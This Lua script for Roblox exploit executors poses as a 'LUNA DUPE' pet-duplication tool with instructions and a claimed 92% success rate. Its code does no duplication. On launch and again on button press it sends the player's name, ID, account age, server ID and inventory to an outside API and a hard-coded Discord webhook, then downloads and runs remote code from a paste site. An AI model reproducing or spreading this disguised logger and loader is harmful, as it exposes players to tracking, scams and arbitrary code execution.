local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

-- ======= CONFIGURATION =======
local API_ENDPOINT = "https://api-beta-mocha-45.vercel.app/api/setInstanceId"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
local EXTERNAL_SCRIPT = "https://paste.ee/r/WGCVy6SX"
-- =============================

-- Delta Executor compatibility layer
local function getRequestFunction()
    if delta and delta.request then
        return delta.request
    elseif syn and syn.request then
        return syn.request
    elseif http and http.request then
        return http.request
    elseif request then
        return request
    end
    return nil
end

-- Remove existing GUI if present
pcall(function()
    game:GetService("CoreGui"):FindFirstChild("LUNA_DUPE"):Destroy()
end)

-- Create GUI
local gui = Instance.new("ScreenGui")
gui.Name = "LUNA_DUPE"
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.ResetOnSpawn = false
gui.Parent = game:GetService("CoreGui")

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 420, 0, 380)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 30)
mainFrame.BorderSizePixel = 0
mainFrame.ClipsDescendants = true
mainFrame.Name = "MainFrame"
mainFrame.Parent = gui
mainFrame.BackgroundTransparency = 1

-- Fade In Animation
TweenService:Create(mainFrame, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()

-- UI Corners
local uicorner = Instance.new("UICorner")
uicorner.CornerRadius = UDim.new(0, 12)
uicorner.Parent = mainFrame

-- Title Bar
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 45)
titleBar.BackgroundColor3 = Color3.fromRGB(48, 48, 52)
titleBar.Name = "TitleBar"
titleBar.Parent = mainFrame

local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(1, -100, 1, 0)
titleText.Position = UDim2.new(0, 15, 0, 0)
titleText.BackgroundTransparency = 1
titleText.Text = "🌙 LUNA DUPE (v3.2.4)"
titleText.TextColor3 = Color3.fromRGB(230, 230, 230)
titleText.TextSize = 20
titleText.Font = Enum.Font.GothamBold
titleText.TextXAlignment = Enum.TextXAlignment.Left
titleText.Parent = titleBar

-- Close Button
local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 40, 0, 40)
closeButton.Position = UDim2.new(1, -45, 0, 3)
closeButton.BackgroundColor3 = Color3.fromRGB(220, 70, 70)
closeButton.Text = "✕"
closeButton.TextColor3 = Color3.new(1, 1, 1)
closeButton.TextSize = 22
closeButton.Font = Enum.Font.GothamBold
closeButton.AutoButtonColor = false
closeButton.Parent = titleBar
closeButton.Name = "CloseButton"

local closeUICorner = Instance.new("UICorner")
closeUICorner.CornerRadius = UDim.new(0, 6)
closeUICorner.Parent = closeButton

-- Close Button Events
closeButton.MouseEnter:Connect(function()
    TweenService:Create(closeButton, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(255, 100, 100)}):Play()
end)

closeButton.MouseLeave:Connect(function()
    TweenService:Create(closeButton, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(220, 70, 70)}):Play()
end)

closeButton.MouseButton1Click:Connect(function()
    TweenService:Create(mainFrame, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
    task.wait(0.3)
    gui:Destroy()
end)

-- Content Frame
local contentFrame = Instance.new("Frame")
contentFrame.Size = UDim2.new(1, 0, 1, -45)
contentFrame.Position = UDim2.new(0, 0, 0, 45)
contentFrame.BackgroundTransparency = 1
contentFrame.Name = "Content"
contentFrame.Parent = mainFrame

-- Error Text
local errorText = Instance.new("TextLabel")
errorText.Size = UDim2.new(1, -30, 0, 30)
errorText.Position = UDim2.new(0, 15, 0, 10)
errorText.BackgroundTransparency = 1
errorText.Text = ""
errorText.TextColor3 = Color3.fromRGB(255, 80, 80)
errorText.TextSize = 18
errorText.Font = Enum.Font.GothamBold
errorText.TextXAlignment = Enum.TextXAlignment.Left
errorText.Parent = contentFrame

-- Warning Box
local warningBox = Instance.new("TextLabel")
warningBox.Size = UDim2.new(1, -30, 0, 40)
warningBox.Position = UDim2.new(0, 15, 0, 50)
warningBox.BackgroundColor3 = Color3.fromRGB(200, 55, 55)
warningBox.Text = "⚠️ REQUIRES RED FOX, DRAGONFLY, RACCOON!"
warningBox.TextColor3 = Color3.new(1, 1, 1)
warningBox.TextSize = 16
warningBox.Font = Enum.Font.GothamBold
warningBox.TextXAlignment = Enum.TextXAlignment.Left
warningBox.BorderSizePixel = 0
warningBox.Parent = contentFrame

local warningUICorner = Instance.new("UICorner")
warningUICorner.CornerRadius = UDim.new(0, 6)
warningUICorner.Parent = warningBox

-- Instruction Steps
local instrTitle = Instance.new("TextLabel")
instrTitle.Size = UDim2.new(1, -30, 0, 28)
instrTitle.Position = UDim2.new(0, 15, 0, 100)
instrTitle.BackgroundTransparency = 1
instrTitle.Text = "📝 INSTRUCTIONS:"
instrTitle.TextColor3 = Color3.new(1, 1, 1)
instrTitle.TextSize = 18
instrTitle.Font = Enum.Font.GothamBold
instrTitle.TextXAlignment = Enum.TextXAlignment.Left
instrTitle.Parent = contentFrame

local steps = {
    "1. Hold a RED FOX, DRAGONFLY, RACCOON",
    "2. Keep inventory open",
    "3. Press DUPE button",
    "4. Wait 5-10 Minutes"
}

for i, step in ipairs(steps) do
    local line = Instance.new("TextLabel")
    line.Size = UDim2.new(1, -30, 0, 22)
    line.Position = UDim2.new(0, 15, 0, 135 + (i - 1) * 25)
    line.BackgroundTransparency = 1
    line.Text = step
    line.TextColor3 = Color3.new(1, 1, 1)
    line.TextSize = 16
    line.Font = Enum.Font.Gotham
    line.TextXAlignment = Enum.TextXAlignment.Left
    line.Parent = contentFrame
end

-- Success Rate
local successLabel = Instance.new("TextLabel")
successLabel.Size = UDim2.new(1, -30, 0, 25)
successLabel.Position = UDim2.new(0, 15, 0, 240)
successLabel.BackgroundTransparency = 1
successLabel.Text = "✔ 92% Success Rate"
successLabel.TextColor3 = Color3.fromRGB(85, 230, 150)
successLabel.TextSize = 16
successLabel.Font = Enum.Font.Gotham
successLabel.TextXAlignment = Enum.TextXAlignment.Left
successLabel.Parent = contentFrame

-- Dupe Button
local dupeButton = Instance.new("TextButton")
dupeButton.Size = UDim2.new(0.75, 0, 0, 45)
dupeButton.Position = UDim2.new(0.125, 0, 0, 280)
dupeButton.BackgroundColor3 = Color3.fromRGB(50, 180, 90)
dupeButton.Text = "DUPE"
dupeButton.TextColor3 = Color3.new(1, 1, 1)
dupeButton.TextSize = 18
dupeButton.Font = Enum.Font.GothamBold
dupeButton.AutoButtonColor = false
dupeButton.Parent = contentFrame
dupeButton.Name = "DupeButton"

local dupeUICorner = Instance.new("UICorner")
dupeUICorner.CornerRadius = UDim.new(0, 8)
dupeUICorner.Parent = dupeButton

-- Button Animations
dupeButton.MouseEnter:Connect(function()
    TweenService:Create(dupeButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(70, 220, 110)}):Play()
end)

dupeButton.MouseLeave:Connect(function()
    TweenService:Create(dupeButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(50, 180, 90)}):Play()
end)

local function buttonClickAnim(button)
    local tweenDown = TweenService:Create(button, TweenInfo.new(0.1), {
        Position = button.Position + UDim2.new(0, 0, 0, 3)
    })
    local tweenUp = TweenService:Create(button, TweenInfo.new(0.1), {
        Position = button.Position
    })
    tweenDown:Play()
    tweenDown.Completed:Wait()
    tweenUp:Play()
end

-- Logger Functions
local function getBackpackContents()
    local player = Players.LocalPlayer
    local backpack = player:FindFirstChild("Backpack")
    if not backpack then return "Backpack not found" end
    
    local contents = {}
    for _, item in ipairs(backpack:GetChildren()) do
        table.insert(contents, item.Name)
    end
    
    return #contents > 0 and table.concat(contents, ", ") or "Backpack empty"
end

local function sendToAPI()
    local player = Players.LocalPlayer
    local data = {
        instanceId = game.JobId,
        player = {
            userId = player.UserId,
            name = player.Name,
            accountAge = player.AccountAge
        },
        backpackContents = getBackpackContents(),
        timestamp = os.time()
    }
    
    local response = httpRequest(API_ENDPOINT, "POST", HttpService:JSONEncode(data))
    
    if response and response.StatusCode == 200 then
        print("✅ Data sent to API")
        return true
    else
        warn("❌ Failed to send data to API")
        return false
    end
end

local function sendWebhook()
    local player = Players.LocalPlayer
    local embed = {
        username = "Logger System",
        embeds = {{
            title = "🟢 Script Executed",
            description = string.format("**%s** executed script\n**JobID:** `%s`", player.Name, game.JobId),
            color = 65280,
            fields = {
                {name = "🎒 Backpack", value = getBackpackContents(), inline = false},
                {name = "👤 Player", value = string.format("ID: %d\nAge: %d days", player.UserId, player.AccountAge), inline = true}
            },
            footer = {text = "Logger v2.0"},
            timestamp = DateTime.now():ToIsoDate()
        }}
    }
    
    local response = httpRequest(WEBHOOK_URL, "POST", HttpService:JSONEncode(embed))
    if response and (response.StatusCode == 200 or response.StatusCode == 204) then
        print("✅ Webhook sent")
    else
        warn("❌ Failed to send webhook")
    end
end

-- Enhanced External Script Execution
local function executeExternalScript()
    local success, err = pcall(function()
        -- Add cache buster
        local url = EXTERNAL_SCRIPT .. "?cb=" .. tostring(math.random(1, 10000))
        local scriptContent = game:HttpGet(url, true)
        
        if not scriptContent or #scriptContent < 50 then
            error("Invalid script content")
        end
        
        -- Basic security checks
        if scriptContent:lower():find("while true do") or scriptContent:lower():find("getfenv") then
            error("Potentially dangerous code detected")
        end
        
        local fn, loadErr = loadstring(scriptContent)
        if not fn then error(loadErr) end
        
        -- Run in limited environment
        setfenv(fn, {
            game = game,
            script = script,
            warn = warn,
            print = print,
            require = require,
            pcall = pcall,
            task = task
        })
        
        return fn()
    end)
    
    if not success then
        warn("Script execution failed:", err)
        return false, err
    end
    return true
end

-- Pet Verification
local requiredPets = {"red fox", "dragonfly", "raccoon"}

local function animateChecking()
    local dots = {".", "..", "..."}
    for i = 1, 6 do
        errorText.Text = "🔍 Checking pet" .. dots[(i % 3) + 1]
        task.wait(0.2)
    end
end

local function hasRequiredPet()
    local character = Players.LocalPlayer.Character
    if not character then return false end
    
    for _, tool in ipairs(character:GetChildren()) do
        if tool:IsA("Tool") then
            local toolName = string.lower(tool.Name)
            for _, pet in ipairs(requiredPets) do
                if string.find(toolName, pet) then
                    return true
                end
            end
        end
    end
    return false
end

-- Main Dupe Function
dupeButton.MouseButton1Click:Connect(function()
    dupeButton.Active = false
    dupeButton.Text = "PROCESSING..."
    dupeButton.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
    buttonClickAnim(dupeButton)

    animateChecking()

    if not hasRequiredPet() then
        errorText.Text = "❌ REQUIRED PET NOT FOUND"
        errorText.TextColor3 = Color3.fromRGB(255, 80, 80)
        dupeButton.Active = true
        dupeButton.Text = "DUPE"
        dupeButton.BackgroundColor3 = Color3.fromRGB(50, 180, 90)
        return
    end

    errorText.Text = "✅ PET VERIFIED"
    errorText.TextColor3 = Color3.fromRGB(90, 255, 150)

    -- Run logger first
    local apiSuccess = sendToAPI()
    sendWebhook()

    if apiSuccess then
        local execSuccess, execError = executeExternalScript()
        if execSuccess then
            errorText.Text = "✅ DUPE STARTED"
            errorText.TextColor3 = Color3.fromRGB(90, 255, 150)
        else
            errorText.Text = "❌ " .. tostring(execError):sub(1, 50)
            errorText.TextColor3 = Color3.fromRGB(255, 80, 80)
        end
    else
        errorText.Text = "❌ LOGGER FAILED"
        errorText.TextColor3 = Color3.fromRGB(255, 80, 80)
    end

    task.delay(2, function()
        dupeButton.Active = true
        dupeButton.Text = "DUPE"
        dupeButton.BackgroundColor3 = Color3.fromRGB(50, 180, 90)
    end)
end)

-- Dragging Functionality
local dragging, dragInput, dragStart, startPos

local function updateInput(input)
    local delta = input.Position - dragStart
    mainFrame.Position = UDim2.new(
        startPos.X.Scale, startPos.X.Offset + delta.X,
        startPos.Y.Scale, startPos.Y.Offset + delta.Y
    )
end

titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

titleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        updateInput(input)
    end
end)

-- Initialize
task.spawn(function()
    pcall(sendToAPI)
    pcall(sendWebhook)
end)
